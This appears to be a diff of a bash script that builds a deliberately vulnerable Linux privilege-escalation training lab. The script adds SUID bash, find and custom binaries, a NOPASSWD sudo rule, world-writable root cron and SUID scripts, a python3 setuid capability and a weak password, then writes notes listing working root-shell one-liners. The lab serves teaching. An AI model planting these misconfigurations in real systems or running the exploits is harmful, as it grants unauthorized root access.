@@ -1,39 +1,65 @@
 #!/bin/bash
 
-echo "[+] Creating vulnerable user..."
+echo "[+] Updating system..."
+apt update -y
 
-# create user
+echo "[+] Installing packages..."
+apt install -y sudo cron wget gcc python3 libcap2-bin vim
+
+echo "[+] Creating lab user..."
+
 useradd -m -s /bin/bash normaluser
 echo "normaluser:password123" | chpasswd
 
-echo "[+] Installing required packages..."
-apt update
-apt install -y sudo cron wget gcc
+echo "[+] Configuring vulnerable sudo rule..."
 
-echo "[+] Adding weak sudo permission..."
-
-# allow sudo but with misconfiguration
 echo "normaluser ALL=(ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
 
-echo "[+] Creating SUID vulnerable binary..."
+echo "[+] Creating SUID bash..."
 
-cat << 'EOF' > /tmp/rootbash.c
-#include <stdio.h>
-#include <stdlib.h>
+cp /bin/bash /usr/local/bin/bash
+chown root:root /usr/local/bin/bash
+chmod 4755 /usr/local/bin/bash
+
+echo "[+] Creating SUID find..."
+
+cp /usr/bin/find /usr/local/bin/find
+chmod 4755 /usr/local/bin/find
+chown root:root /usr/local/bin/find
+
+echo "[+] Creating writable SUID script scenario..."
+
+mkdir -p /opt/myapp
+
+cat << 'EOF' > /opt/myapp/cleanup_script.sh
+#!/bin/bash
+echo "Cleaning old logs..."
+rm -rf /tmp/myapp_logs/*
+echo "Done."
+EOF
+
+chmod 777 /opt/myapp/cleanup_script.sh
+chown root:normaluser /opt/myapp/cleanup_script.sh
+chmod u+s /opt/myapp/cleanup_script.sh
+
+echo "[+] Creating vulnerable SUID binary..."
+
+cat << 'EOF' > /tmp/privesc.c
 #include <unistd.h>
+#include <stdlib.h>
 
 int main(){
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
-    return 0;
+setuid(0);
+setgid(0);
+system("/usr/local/bin/bash -p");
+return 0;
 }
 EOF
 
-gcc /tmp/rootbash.c -o /usr/local/bin/rootbash
+gcc /tmp/privesc.c -o /usr/local/bin/privesc
 
-chmod 4755 /usr/local/bin/rootbash
-chown root:root /usr/local/bin/rootbash
+chmod 4755 /usr/local/bin/privesc
+chown root:root /usr/local/bin/privesc
 
 echo "[+] Creating vulnerable cron job..."
 
@@ -44,29 +70,86 @@ cat << 'EOF' > /opt/backup/backup.sh
 tar -cf /tmp/backup.tar /home
 EOF
 
-chmod +x /opt/backup/backup.sh
 chmod 777 /opt/backup/backup.sh
+chmod +x /opt/backup/backup.sh
 
 echo "* * * * * root /opt/backup/backup.sh" >> /etc/crontab
 
-echo "[+] Downloading pspy for monitoring cron..."
+echo "[+] Setting Python capability vulnerability..."
 
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O /home/normaluser/pspy64
+setcap cap_setuid+ep /usr/bin/python3
+
+echo "[+] Installing pspy..."
+
+wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 \
+-O /home/normaluser/pspy64
+
 chmod +x /home/normaluser/pspy64
 chown normaluser:normaluser /home/normaluser/pspy64
 
-echo "[+] Lab Setup Complete!"
+echo "[+] Creating training notes..."
+
+cat << 'EOF' > /home/normaluser/privesc_notes.txt
+
+Privilege Escalation Enumeration Guide
+
+Find SUID binaries:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Pro tip if list is huge:
+
+find / -perm -4000 -type f 2>/dev/null | grep -E "python|perl|bash|nmap|vim|more|less"
+
+Examples to exploit:
+
+SUID bash
+/usr/local/bin/bash -p
+
+Python capability exploit
+/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+
+Sudo find exploit
+sudo find . -exec /bin/sh -p \; -quit
+
+Writable SUID script exploit
+echo "/bin/bash -p" >> /opt/myapp/cleanup_script.sh
+
+Cron job exploit
+echo "/usr/local/bin/bash -p" >> /opt/backup/backup.sh
+
+Use pspy to discover cron jobs
+
+./pspy64
+
+EOF
+
+chown normaluser:normaluser /home/normaluser/privesc_notes.txt
+
+echo "[+] Enabling cron..."
+
+systemctl enable cron
+systemctl start cron
 
 echo ""
-echo "======================================"
-echo "Login with:"
-echo "username: normaluser"
-echo "password: password123"
-echo "======================================"
-
+echo "========================================"
+echo "      PRIVILEGE ESCALATION LAB READY"
+echo "========================================"
 echo ""
-echo "Privilege Escalation Paths:"
-echo "1. sudo -l (find misconfig)"
-echo "2. SUID binary /usr/local/bin/rootbash"
-echo "3. Cron job writable script (discover with pspy)"
+echo "Login:"
+echo "User: normaluser"
+echo "Pass: password123"
 echo ""
+echo "Available PrivEsc Paths:"
+echo ""
+echo "1. sudo find misconfiguration"
+echo "2. SUID bash"
+echo "3. SUID custom binary"
+echo "4. Writable SUID script"
+echo "5. Cron job (discover with pspy)"
+echo "6. Python capability exploit"
+echo ""
+echo "Training notes located at:"
+echo "/home/normaluser/privesc_notes.txt"
+echo ""
+echo "========================================"
